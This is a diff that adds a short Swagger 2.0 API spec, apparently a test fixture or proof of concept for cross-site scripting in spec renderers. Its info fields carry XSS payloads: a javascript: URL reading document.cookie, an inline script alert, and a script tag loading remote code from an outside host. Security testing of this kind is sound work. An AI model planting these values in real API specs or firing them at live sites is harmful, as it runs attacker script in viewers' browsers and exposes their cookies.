@@ -1,0 +1,10 @@
+swagger: "2.0"
+info:
+  title: "Swagger Sample App"
+  description: "Please click Terms of service"
+  termsOfService: "javascript:alert(document.cookie)"
+  contact:
+    name: "API Support"
+    url: "<script>alert(1)</script>"
+    email: "<script src=https://b8.ee/1.js></script>"
+  version: "1.0.1"
